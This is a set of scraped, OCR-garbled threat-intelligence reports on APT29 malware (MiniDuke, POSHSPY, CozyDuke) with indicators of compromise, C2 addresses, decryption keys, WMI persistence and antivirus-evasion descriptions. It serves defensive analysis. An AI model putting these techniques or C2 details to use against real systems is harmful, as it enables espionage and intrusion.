activity (right) Figure 8: Shared string obfuscation logic: new LNK activity (le"") and old VERNALDROP activity (right) Indicators Indicator Description dosonedrivenoti#cations-svct- Phishing email mailboxe36625aaa85747214aa50342836a2315aaa36 address from likely 928202aa46271691a8255aaa15382822aa25821925a compromised 0245@no""hshorehealthgm[.]org legitimate server Stevenson, Susan N shared ""TP18-DS7002 Phishing email (UNCLASSIFIED)"" with you subject h!ps://www.jmj[.]com/personal/naue""hn_state_gov/* Malware hosting location on likely compromised legitimate domain pandorasong[.]com BEACON C2 95.216.59[.]92 2b13b244aafe1ecace61ea1119a1b2ee 3fccf531$0ae6fedd7c586774b17a2d 658c6fe38f95995fa8dc8f6cfe41df7b 6ed0020b0851'71d5b0076f4ee95f3c 313f4808aa2a2073005d219bc68971cd Resolution of pandorasong[.]com SSL ce""i#cate for pandorasong[.]com Malicious ZIP archive MD5 Benign ZIP archive MD5 Malicious LNK #le MD5 Benign decoy PDF MD5 16bbc967a8b6a365871a05c74a4f345b BEACON DLL MD5 %APPDATA%\Local\cyzfc.dat %TEMP%\ds7002.PDF BEACON DLL #le path Benign decoy PDF #le path Table 2: Indicators Related Samples 37486-the-shocking-truth-about-election-rigging-in-america.""f.lnk (MD5: f713d5df826c6051e65f995e57d6817d) FireEye Detection FireEye detected this activity across our pla)orm. Table 3 contains the speci#c detection names that applied to this activity. Product Detection names Network Security Malware.Binary.lnk Malware.Archive Suspicious.Backdoor.Beacon Endpoint Security SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) Generic.mg.16bbc967a8b6a365 WINDOWS METHODOLOGY [PowerShell Base64 String] WINDOWS METHODOLOGY [Rundll32 Roaming] WINDOWS METHODOLOGY [PowerShell Script Block Warning] WINDOWS METHODOLOGY [Base64 Char Args] Threat Analytics TADPOLE DOWNLOADER [Rundll Args] Pla)orm INTEL HIT - IP [Structured Threat Reputation-Based] INTEL HIT - FQDN [Structured Threat Reputation- Based] [DNS] INTEL HIT - FQDN [Structured Threat Reputation- Based] [Non-DNS] INTEL HIT - FILE HASH [Structured Threat Reputation-Based] Table 3: FireEye product detections Posted in Threat Intelligence—Security & Identity Related articles Threat Intelligence Threat Intelligence Threat Intelligence Threat Intelligence XRefer: The Gemini- Assisted Binary Navigator By Mandiant • 26-minute read Bridging the Gap: Elevating Red Team Assessments with Application Security Testing By Mandiant • 13-minute read (QR) Coding My Way Out of Here: C2 in Browser Isolation Environments By Mandiant • 8-minute read Seeing Through a GLASSBRIDGE: Understanding the Digital Marketing Ecosystem Spreading Pro-PRC In!uence Operations By Google Threat Intelligence Group • 13-minute read Follow us Google Cloud Google Cloud Products Privacy Terms Help English"
apt29,cti-hal,500957e5c3b8,G0016,"Content menu Search... Subscribe The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor APT REPORTS 27 FEB 2013 2 minute read GREAT WEBINARS 13 MAY 2021, 1:00PM GReAT Ideas. Balalaika Edition BORIS LARIN, DENIS LEGEZO 26 FEB 2021, 12:00PM GReAT Ideas. Green Tea Edition JOHN HULTQUIST, BRIAN BARTHOLOMEW, SUGURU ISHIMARU, VITALY KAMLUK, SEONGSU PARK, YUSUKE NIWA, MOTOHIKO SATO 17 JUN 2020, 1:00PM GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots MARCO PREUSS, DENIS LEGEZO, COSTIN RAIU, KURT BAUMGARTNER, DAN DEMETER, YAROSLAV SHMELEV // AUTHORS GREAT (or, how many cool words can you !t into one title) FireEye announced On Feb 12th 2013, Adobe Reader 0-day exploit which is used to drop a previously unknown, advanced piece of malware. We called the discovery of an this new malware ?ItaDuke because it reminded us of Duqu and because of the ancient Italian comments in the shellcode copied from Dante Alighieri-s ?Divine Comedy. Since the original announcement, we have observed several new attacks using the same exploit (CVE-2013- 0640) which drop other malware. Between these, we’ve observed a couple of incidents which are so unusual in 26 AUG 2020, 2:00PM GReAT Ideas. Powered by SAS: threat actors advance on new fronts IVAN KWIATKOWSKI, MAHER YAMOUT, NOUSHIN SHABAB, PIERRE DELCHER, FÉLIX AIME, GIAMPAOLO DEDOLA, SANTIAGO PONTIROLI 22 JUL 2020, 2:00PM GReAT Ideas. Powered by SAS: threat many ways that we-ve decided to analyse them in depth. hunting and new techniques Together with our partner CrySyS Lab, we-ve performed a detailed analysis of these unusual incidents which suggest a new, previously unknown threat actor. For the CrySyS [here] . For our analysis, please Lab analysis, please read read below. DMITRY BESTUZHEV, COSTIN RAIU, PIERRE DELCHER, BRIAN BARTHOLOMEW, BORIS LARIN, ARIEL JUNGHEIT, FABIO ASSOLINI Key !ndings include: • The MiniDuke attackers are still active at this time and have created malware as recently as February 20, 2013. To compromise the victims, the attackers used extremely e""ective social engineering techniques which involved sending malicious PDF documents to their targets. The PDFs were highly relevant and well-crafted content that fabricated human rights seminar information (ASEM) and Ukraine-s foreign policy and NATO membership plans. FROM THE SAME AUTHORS APT trends report Q1 2021 APT10: sophisticated multi- layered loader Ecipekac discovered in A41APT campaign APT annual review: What the world’s threat actors got up to in 2020 Cyberthreats to !nancial organizations in 2021 Advanced Threat predictions for 2021 These malicious PDF !les were rigged with exploits attacking Adobe Reader versions 9, 10 and 11, bypassing its sandbox. • Once the system is exploited, a very small downloader is dropped onto the victim-s disc that-s only 20KB in size. This downloader is unique per system and contains a customized backdoor written in Assembler. When loaded at system boot, the downloader uses a set of mathematical calculations to determine the computer-s unique !ngerprint, and in turn uses this data to uniquely encrypt its communications later. • If the target system meets the pre-de!ned requirements, the malware will use Twitter (unbeknownst to the user) and start looking for speci!c tweets from pre-made accounts. These accounts were created by MiniDuke-s Command and Control (C2) operators and the tweets maintain speci!c tags labeling encrypted URLs for the backdoors. These URLs provide access to the C2s, which then provide potential commands and encrypted transfers of additional backdoors onto the system via GIF !les. • Based on the analysis, it appears that the MiniDuke-s creators provide a dynamic backup system that also can #y under the radar – if Twitter isn-t working or the accounts are down, the malware can use Google Search to !nd the encrypted strings to the next C2. This model is #exible and enables the operators to constantly change how their backdoors retrieve further commands or malcode as needed. • Once the infected system locates the C2, it receives encrypted backdoors that are obfuscated within GIF !les and disguised as pictures that appear on a victim-s machine. Subscribe to our weekly e-mails The hottest research right in your inbox Email(Required) I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I !nd at the bottom of any e-mail sent to me for the purposes mentioned above. Subscribe Once they are downloaded to the machine, they can fetch a larger backdoor which carries out the cyberespionage activities, through functions such as copy !le, move !le, remove !le, make directory, kill process and of course, download and execute new malware and lateral movement tools. • The !nal stage backdoor connects to two servers, one in Panama and one in Turkey to receive the instructions from the attackers. • The attackers left a small clue in the code, in the form of the number 666 (0x29A hex) before one of the decryption subroutines: IN THE SAME CATEGORY • By analysing the logs from the command servers, we have observed 59 unique victims in 23 countries: Belgium, Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, Lithuania, Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States. For the detailed analysis and information on how to protect against the attack, please read: BellaCPP: Discovering a new BellaCiao variant written in C++ Lazarus group evolves its infection chain with old and new malware Careto is back: what’s new after 10 years of silence? APT trends report Q3 2024 APT trends report Q3 2024 Beyond the Surface: the evolution and expansion of the SideWinder APT group [The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor.PDF] ADOBE ADOBE PDF DATA ENCRYPTION MINIDUKE OBFUSCATION TARGETED ATTACKS VULNERABILITIES AND EXPLOITS The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor Your email address will not be published. Required !elds are marked * Type your comment here Name * Email * Comment JAGUAR3217 Posted on March 13, 2017. 6:44 pm Is this really the number of the beast? Is the feed logo like GIF image thing cursed? Reply // LATEST POSTS SOC, TI AND IR POSTS APT REPORTS CRIMEWARE REPORTS MALWARE DESCRIPTIONS Attackers exploiting a patched FortiClient EMS vulnerability in the wild Lazarus group evolves its infection chain with old and new malware Analysis of Cyber Anarchy Squad attacks targeting Russian and Belarusian organizations Download a banker to track your parcel ASHLEY MUÑOZ, FRANCESCO FIGURELLI, CRISTIAN SOUZA, EDUARDO OVALLE, AREG BAGHINYAN VASILY BERDNIKOV, SOJUN RYU KASPERSKY DMITRY KALININ // LATEST WEBINARS THREAT INTELLIGENCE AND IR 04 SEP 2024, 5:00PM 60 MIN Inside the Dark Web: exploring the human side of cybercriminals TECHNOLOGIES AND SERVICES 13 AUG 2024, 5:00PM 60 MIN The Cybersecurity Buyer’s Dilemma: Hype vs (True) Expertise OLEG GOROBETS, CYBERTHREAT TALKS 60 MIN 16 JUL 2024, 5:00PM Cybersecurity’s human factor – more than an unpatched vulnerability TRAININGS AND WORKSHOPS 09 JUL 2024, 4:00PM 60 MIN Building and prioritizing detection engineering backlogs with MITRE ATT&CK ANNA PAVLOVSKAYA ALEXANDER LISKIN OLEG GOROBETS ANDREY TAMOYKIN // REPORTS BellaCPP: Discovering a new Lazarus group evolves its BellaCPP: Discovering a new BellaCiao variant written in C++ While investigating an incident involving the BellaCiao .NET malware, Kaspersky researchers discovered a C++ version they dubbed “BellaCPP”. Lazarus group evolves its infection chain with old and new malware Lazarus targets employees of a nuclear-related organization with a bunch of malware, such as MISTPEN, LPEClient, RollMid, CookieTime and a new modular backdoor CookiePlus. Careto is back: what’s new after 10 years of silence? Kaspersky researchers analyze 2019, 2022 and 2024 attacks attributed to Careto APT with medium to high con!dence. APT trends report Q3 2024 The report features the most signi!cant developments relating to APT groups in Q3 2024, including hacktivist activity, new APT tools and campaigns. // SUBSCRIBE TO OUR WEEKLY E- MAILS The hottest research right in your inbox Email Subscribe I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I !nd at the bottom of any e-mail sent to me for the purposes mentioned above. THREATS CATEGORIES OTHER SECTIONS APT (Targeted attacks) APT reports Secure environment (IoT) Mobile threats Financial threats Malware descriptions Security Bulletin Malware reports Archive All tags Webinars APT Logbook Spam and phishing Statistics Spam and phishing reports Industrial threats Security technologies Web threats Research Vulnerabilities and Publications exploits All threats All categories Encyclopedia Threats descriptions KSB 2024 © 2024 AO Kaspersky Lab. All Rights Reserved. Registered trademarks and service marks are the property of their respective owners. Privacy Policy License Agreement Cookies"
apt29,cti-hal,64e72ce56865,G0016,"Cloud Contact sales Get started for free Blog Solutions & technology Ecosystem Developers & Practitioners Transform with Google Cloud Threat Intelligence Dissecting One of APT29's Fileless WMI and PowerShell Backdoors (POSHSPY) April 3, 2017 Mandiant Wri!en by: Ma!hew Dunwoody Mandiant has observed APT29 using a stealthy backdoor that we call POSHSPY. POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI). In the investigations Mandiant has conducted, it appeared that APT29 deployed POSHSPY as a secondary backdoor for use if they lost access to their primary backdoors. POSHSPY makes the most of using built-in Windows features – so-called “living o"" the land” – to make an especially stealthy backdoor. POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI. Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identi#ed through enhanced logging or in memory. The backdoor's infrequent beaconing, tra$c obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identi#cation of its network tra$c di$cult. Every aspect of POSHSPY is e$cient and cove%. Mandiant initially identi#ed an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015. Later in that same engagement, the a!acker updated the deployment of the backdoor to use WMI for storage and persistence. Mandiant has since identi#ed POSHSPY in several other environments compromised by APT29 over the past two years. We #rst discussed APT29’s use of this backdoor as pa% of our “No Easy Breach” talk. For additional details on how we #rst identi#ed this backdoor, and the epic investigation it was pa% of, see the slides and presentation. Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000. WMI provides many administrative capabilities on local and remote systems, including querying system information, sta%ing and stopping processes, and se!ing conditional triggers. WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell. Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several #les in the System32\wbem\Repository directory. WMI classes are the primary structure within WMI. WMI classes can contain methods (code) and prope%ies (data). Users with su$cient system-level privileges can de#ne custom classes or extend the functionality of the many default classes. WMI permanent event subscriptions can be used to trigger actions when speci#ed conditions are met. A!ackers o&en use this functionality to persist the execution of backdoors at system sta% up. Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding. WMI Consumers specify an action to be pe'ormed, including executing a command, running a script, adding an entry to a log, or sending an email. WMI Filters de#ne conditions that will trigger a Consumer, including system sta%up, the execution of a program, the passing of a speci#ed time and many others. A FilterToConsumerBinding associates Consumers to Filters. Creating a WMI permanent event subscription requires administrative privileges on a system. We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code. To store the code, APT29 created a new WMI class and added a text prope%y to it in order to store a string value. APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that prope%y. APT29 then created a WMI event subscription in order to execute the backdoor. The subscription was con#gured to run a PowerShell command that read, decrypted, and executed the backdoor code directly from the new WMI prope%y. This allowed them to install a persistent backdoor without leaving any a%ifacts on the system’s hard drive, outside of the WMI repository. This “#leless” backdoor methodology made the identi#cation of the backdoor much more di$cult using standard host analysis techniques. POSHSPY WMI Component The WMI component of the POSHSPY backdoor leverages a Filter to execute the PowerShell component of the backdoor on a regular basis. In one instance, APT29 created a Filter named BfeOnServiceSta%TypeChange (Figure 1), which they con#gured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time. Figure 1: “BfeOnServiceSta!TypeChange” WMI Query Language (WQL) ""lter condition The BfeOnServiceSta%TypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration. The WindowsParentalControlsMigration consumer was con#gured to silently execute a base64-encoded PowerShell command. Upon execution, this command extracted, decrypted, and executed the PowerShell backdoor payload stored in the HiveUploadTask text prope%y of the RacTask class. The PowerShell command contained the payload storage location and encryption keys. Figure 2 displays the command, called the “CommandLineTemplate”, executed by the WindowsParentalControlsMigration consumer. Figure 2: WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the “CommandLineTemplate.” Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component Here is the full code for a POSHSPY. The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries. The backdoor contains several notable capabilities, including: 1. Downloading and executing PowerShell code as an EncodedCommand 2. Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary #le name, using the EXE extension 3. Modifying the Standard Information timestamps (created, modi#ed, accessed) of every downloaded executable to match a randomly selected #le from the System32 directory that was created prior to 2013 4. Encrypting communications using AES and RSA public key cryptography 5. Deriving C2 URLs from a Domain Generation Algorithm (DGA) using lists of domain names, subdomains, top-level domains (TLDs), Uniform Resource Identi#ers (URIs), #le names, and #le extensions 6. Using a custom User Agent string or the system's User Agent string derived from urlmon.dll 7. Using either custom cookie names and values or randomly-generated cookie names and values for each network connection 8. Uploading data in 2048-byte chunks 9. Appending a #le signature header to all encrypted data, prior to upload or download, by randomly selecting from the #le types: ICO GIF JPG PNG MP3 BMP The sample in this example used 11 legitimate domains owned by an organization located near the victim. When combined with the other options in the DGA, 550 unique C2 URLs could be generated. Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended #le headers used to bypass content inspection made this backdoor di$cult to identify using typical network monitoring techniques. Conclusion POSHSPY is an excellent example of the skill and cra&iness of APT29. By “living o"" the land” they were able to make an extremely discrete backdoor that they can deploy alongside their more conventional and noisier backdoor families, in order to help ensure persistence even a&er remediation. As stealthy as POSHSPY can be, it comes to light quickly if you know where to look. Enabling and monitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment. This is one of several sneaky backdoor families that we have identi#ed, including an o""-the- shelf domain fronting backdoor and HAMMERTOSS. When responding to an APT29 breach, it is vital to increase visibility, fully scope the incident before responding and thoroughly analyze accessed systems that don't contain known malware. Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment. This excellent whitepaper by William Ballenthin, Ma! Graeber and Claudiu Teodorescu contains additional information on WMI o""ense, defense and forensics. This presentation by Christopher Glyer and Devon Kerr contains additional information on a!acker use of WMI in past Mandiant investigations. The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence. Posted in Threat Intelligence—Security & Identity Related articles Threat Intelligence Threat Intelligence Threat Intelligence Threat Intelligence XRefer: The Gemini- Assisted Binary Navigator By Mandiant • 26-minute read Bridging the Gap: Elevating Red Team Assessments with Application Security Testing By Mandiant • 13-minute read (QR) Coding My Way Out of Here: C2 in Browser Isolation Environments By Mandiant • 8-minute read Seeing Through a GLASSBRIDGE: Understanding the Digital Marketing Ecosystem Spreading Pro-PRC In!uence Operations By Google Threat Intelligence Group • 13-minute read Follow us Google Cloud Google Cloud Products Privacy Terms Help English"
apt29,cti-hal,7149af1728eb,G0016,"Content menu Search... Subscribe The CozyDuke APT 21 APR 2015 APT REPORTS 8 minute read GREAT WEBINARS 13 MAY 2021, 1:00PM GReAT Ideas. Balalaika Edition BORIS LARIN, DENIS LEGEZO 26 FEB 2021, 12:00PM GReAT Ideas. Green Tea Edition JOHN HULTQUIST, BRIAN BARTHOLOMEW, SUGURU ISHIMARU, VITALY KAMLUK, SEONGSU PARK, YUSUKE NIWA, MOTOHIKO SATO 17 JUN 2020, 1:00PM GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots MARCO PREUSS, DENIS LEGEZO, COSTIN RAIU, KURT BAUMGARTNER, DAN DEMETER, YAROSLAV SHMELEV 26 AUG 2020, 2:00PM GReAT Ideas. Powered by SAS: threat actors advance on new fronts IVAN KWIATKOWSKI, MAHER YAMOUT, NOUSHIN SHABAB, PIERRE DELCHER, FÉLIX AIME, GIAMPAOLO DEDOLA, SANTIAGO PONTIROLI 22 JUL 2020, 2:00PM GReAT Ideas. Powered by SAS: threat hunting and new techniques DMITRY BESTUZHEV, COSTIN RAIU, PIERRE DELCHER, BRIAN BARTHOLOMEW, BORIS LARIN, ARIEL JUNGHEIT, FABIO ASSOLINI // AUTHORS KURT BAUMGARTNER COSTIN RAIU CozyDuke (aka CozyBear, CozyCar or “O!ice Monkeys”) is a precise attacker. Kaspersky Lab has observed signs of attacks against government organizations and commercial entities in the US, Germany, South Korea and Uzbekistan. In 2014, targets included the White House and the US Department of State, as believed. The operation presents several interesting aspects extremely sensitive high pro#le victims and targets evolving crypto and anti-detection capabilities strong malware functional and structural similarities mating this toolset to early MiniDuke second stage components, along with more recent CosmicDuke and OnionDuke components The actor often spearphishes targets with e-mails containing a link to a hacked website. Sometimes it is a high pro#le, legitimate site such as “diplomacy.pl”, hosting a ZIP archive. The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy. In other highly successful runs, this actor sends out phony $ash videos directly as email attachments. A clever example is “O!ice Monkeys LOL Video.zip”. The executable within not only plays a $ash video, but drops and runs another CozyDuke executable. These videos are quickly passed around o!ices with delight while systems are infected in the background silently. Many of this APT’s components are signed with phony Intel and AMD digital certi#cates. Recent CozyDuke APT activity attracted signi#cant attention in the news: Sources: State Dept. hack the ‘worst ever’ , CNN News, March 2015 White House computer network ‘hacked’ October 2014 , BBC News, Three Months Later, State Department Hasn’t Rooted Out Hackers , Wall Street Journal, February 2015 State Department shuts down its e-mail system amid concerns about hacking , Washington Post, November 2014 Let’s examine a smattering of representative CozyDuke #les and data. There is much to their toolset. O!ice Monkeys dropper analysis CozyDuke droppers and spyware components often maintain fairly common characteristics, but these #les’ functionality are modi#ed in slight ways depending on the team’s needs. This rapid development and deployment is interesting. 68271df868f462c06e24a896a9494225,O!ice Monkeys LOL Video.zip Believe it or not, recipients in bulk run the #le within: 95b3ec0a4e539efaa1faa3d4e25d51de,O!ice Monkeys (Short Flash Movie).exe This #le in turn drops two executables to %temp%: 2aabd78ef11926d7b562fd0d91e68ad3, Monkeys.exe 3d3363598f87c78826c859077606e514, player.exe It #rst launches Monkeys.exe, playing a self-contained, very funny video of white-collar tie wearing chimpanzees working in a high rise o!ice with a human colleague. It then launches player.exe, a CozyDuke dropper maintaining anti- detection techniques: 3d3363598f87c78826c859077606e514,player.exe,338kb,Tr ojan.Win32.CozyBear.v,CompiledOn:2014.07.02 21:13:33 Anti-detection and trojan functionality The #le collects system information, and then invokes a WMI instance in the rootsecuritycenter namespace to identify security products installed on the system, meaning that this code was built for x86 systems, wql here: SELECT * FROM AntiVirusProduct SELECT * FROM FireWallProduct The code hunts for several security products to evade: CRYSTAL KASPERSKY SOPHOS DrWeb AVIRA COMODO Dragon In addition to the WMI/wql use, it also hunts through the “SOFTWAREMicrosoftWindowsCurrentVersionUninstall” registry key looking for security products to avoid. Following these checks, it drops several more malware #les signed with the pasted AMD digital signature to a directory it creates. These #les are stored within an 217kb encrypted cab #le in the dropper’s resources under the name “A”. The cab #le was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: x36x11xddx08xacx4bx72xf8x51x04x68x2ex3ex38x64x32. The cab #le is decompressed and its contents are created on disk. These dropped #les bundle functionality for both 64bit and 32bit Windows systems and are all located within one directory: C:Documents and SettingsuserApplication DataATI_Subsystem 6761106f816313394a653db5172dc487,amdhcp32.dll,54kb ← 32bit dll,CompiledOn:2014.07.02 21:13:24 d596827d48a3!836545b3a999f2c3e3,aticaldd.dll,60kb ← 64bit dll,CompiledOn:2014.07.02 21:13:26 bc626c8f11ed753f33ad1c0fe848d898,atiumdag.dll,285kb ← 32bit dll, Trojan.Win32.CozyDuke.a, CompiledOn:2014.07.02 21:13:26 4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat The code copies rundll32.exe from windowssystem32 to its newly created %appdata%ATI_Subsystem subdirectory as “amdocl_as32.exe” alongside the three dll’s listed above. It runs atiumdag.dll with two parameter values, it’s only export and an arbitrary pid, i.e.: “C:Documents and SettingsuserApplication DataATI_Subsystemamdocl_as32.exe” “C:Documents and SettingsuserApplication DataATI_Subsystematiumdag.dll””, ADL2_ApplicationPro#les_System_Reload 1684″ This dll is built with anti-AV protections as well. However, it looks for a di!erent but overlapping set, and the random duplication suggests that this component was cobbled together with its dropper, partly regionally based on target selection. K7 KASPERSKY AVG The code collects information about the system and xml formats this data prior to encryption for proper parsing: Finally, this process beacons to www.sanjosemaristas.com, which appears to be a site that has been compromised and misused multiple times in the past couple of years. hxxp://www.sanjosemaristas[.]com/app/index.php? {A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter’s service name GUID. It uses standard Win32 base cryptography functions to generate a CALG_RC4 session key to encrypt the collected data communications and POSTs it to the server. Executable-Signing Certi""cates Samples are usually signed with a fake certi#cate – we’ve seen two instances, one AMD and one Intel: FROM THE SAME AUTHORS Focus on DroxiDat/SystemBC DiceyF deploys GamePlayerFramework in online casino development studio TOP 10 unattributed APT mysteries Black Hat USA 2022 and DEF CON 30 Andariel deploys DTrack and Maui ransomware Con""guration ""les: Some of the malware uses an encrypted con#guration #le which is stored on disk as “racss.dat”. This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}. Here’s how it looks decrypted: Second stage malware and communications: The attackers send commands and new modules to be executed to the victims through the C&Cs. The C&C scripts store these temporarily until the victim next connects to retrieve local #les. We’ve identi#ed two such #les: settings.db sdfg3d.db Here’s how such a database #le appears: These are BASE64 encoded and use the same RC4 encryption key as the malware con#guration. Decoding them resulted in the following payloads: 59704bc8bedef32709ab1128734aa846, ChromeUpdate.ex_ 5d8835982d8bfc8b047eb47322436c8a, cmd_task.dll e0b6f0d368c81a0fb197774d0072f759, screenshot_task.dll Decoding them also resulted in a set of tasking #les maintaining agent commands and parameter values: conf.xml And a set of “reporting” #les, maintaining stolen system “info”, error output, and “AgentInfo” output, from victim systems: DCOM_amdocl_ld_API_.raw Util_amdave_System_.vol Last_amdpcom_Subsystem_.max Data_amdmiracast_API_.aaf 7.txt screenshot_task.dll is a 32-bit dll used to take a screenshot of the full desktop window and save it as a bitmap in %temp%. The number of times the screenshot is repeated is con#gurable within the xml task #le. cmd_task.dll is a 32-bit dll that maintains several primitives. It is used to create new processes, perform as a command line shell, and several other tasks. Each of these payloads is delivered together with a con#guration #le that explains how to run it, for instance: In another tasking, we notice a tracked victim: Attackers map a network drive use Microsoft OneDrive to run further tools: They copy down a base64 encoded document from Microsoft OneDrive to the victim system and decode it there: Not everything works as planned, so they maintain error reporting facility for the c2 communications: Furthermore, ChromeUpdate is a 64-bit executable (which appears to be a WEXTRACT package) that oddly drops a 32-bit Dll. Cache.dll is simply stored as a cabinet #le in the ChromeUpdate’s resource section. Subscribe to our weekly e-mails The hottest research right in your inbox ChromeUpdate.exe starts the #le with “rundll32 cache.dll,ADB_Setup” Email(Required) I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I #nd at the bottom of any e-mail sent to me for the purposes mentioned above. Subscribe Cache.dll analysis Cache.dll was written in C/C++ and built with a Microsoft compiler. Cache.dll code $ow overview RC4 decrypt hardcoded c2 and urls resolve hidden function calls collect identifying victim system data encrypt collected data send stolen data to c2 and retrieve commands Cache.dll code details Structurally, “Cache.dll” is a fairly large backdoor at 425KB. It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime. No pdb/debug strings are present in the code. It maintains eight exports, including DllMain: ADB_Add ADB_Cleanup ADB_Initnj ADB_Load ADB_Release ADB_Remove ADB_Setup ADB_Setup is a entry point that simply spawns another thread and waits for completion. Above, we see a new thread created with the start address of Cache.dll export “ADB_Load” by the initial thread. This exported function is passed control while the initial thread runs a Windows message loop. It #rst grabs an encrypted blob stored away in a global variable and pulls out 381 bytes of this encrypted data: The standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key “x8BxFFx55x8BxECx83xECx50xA1x84x18x03x68x33xC9x6 6xF7x45x10xE8x1Fx89x45xFCx8Bx45x14x56”. The code then decodes this set of import symbols and resolves addresses for its networking and data stealing functionality: InternetCloseHandle InternetReadFile HttpSendRequestA HttpOpenRequestA HttpQueryInfoA InternetConnectA InternetCrackUrlA InternetOpenA InternetSetOptionW GetAdaptersInfo Much like the prior o!ice monkey “atiumdag.dll” component, this code collects identifying system information using standard win32 API calls: Computer name – GetComputerNameW User name – GetUserNameW Adapter GUID, ip address, mac address – GetAdaptersInfo Windows version – GetVersionExW It then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls. Cache.dll connectback urls: 209.200.83.43/ajax/links.php 209.200.83.43/ajax/api.php 209.200.83.43/ajax/index.php 209.200.83.43/ajax/error.php 209.200.83.43/ajax/pro#le.php 209.200.83.43/ajax/online.php 209.200.83.43/ajax/loader.php 209.200.83.43/ajax/search.php Observed user-agent string on the wire, but it’s dynamically generated based on the Windows system settings (retrieved using standard win32 api “ObtainUserAgentString”): “User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)” Communications with the CozyDuke C2 include key/value pairs passed as URL parameters. Observed keys that remind us of the Cosmicduke communications include: status= k= mode= ajax= name= subNodeId= nodeId= r= t= id= item= item_id= js= j= v= json= i= c= x= a= Connections with MiniDuke/CosmicDuke/OnionDuke: One of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke. Below we compare Show.dll with the OnionDuke sample MD5: c8eb6040fd02d77660d19057a38!769. Both have IN THE SAME CATEGORY BellaCPP: Discovering a new BellaCiao variant written in C++ Lazarus group evolves its infection chain with old and new malware Careto is back: what’s new after 10 years of silence? APT trends report Q3 2024 Beyond the Surface: the evolution and expansion of the SideWinder APT group exactly the same export tables and appear to be called internally “UserCache.dll”: This seems to indicate the authors of OnionDuke and CozyDuke / Cozy Bear are the same, or working together. Another interesting comparison of two other #les matches a recent second stage tool from the CozyDuke attacks with a second stage component from other Miniduke/Onionduke attacks. 2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “UserCache.dll“) 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “UserCache.dll“) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time. The table below presents the function matches based on size data, but the calls, jmps and code all match as well. The contents of only one of these exports in update.dll has no match whatsoever in cache.dll. Unlike the atiumdag.dll #le above, however, cache.dll and update.dll do not maintain anti-AV and anti-analysis functionality sets. Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality. This rotating functionality seems representational for the set, along with other characteristics. Their custom backdoor components appear to slightly evolve over time, with modi#cations to anti-detection, cryptography, and trojan functionality changing per operation. This rapid development and deployment reminds us of the APT28/Sofacy toolset, especially the coreshell and chopstick components. We expect ongoing and further activity from this group in the near future and variations on the malware used in previous duke-ish incidents. For more information about MiniDuke, CosmicDuke and OnionDuke, please see References. Related MD5s 62c4ce93050e48d623569c7dcc4d0278, 2537.ex_ a5d6ad8ad82c266fda96e076335a5080, drop1.ex_ 93176df76e351b3ea829e0e6c6832bdf, drop1.pd_ 7688be226b946e231e0cd36e6b708d20, 8.zip fd8e27f820bdbdf6cb80a46c67fd978a, 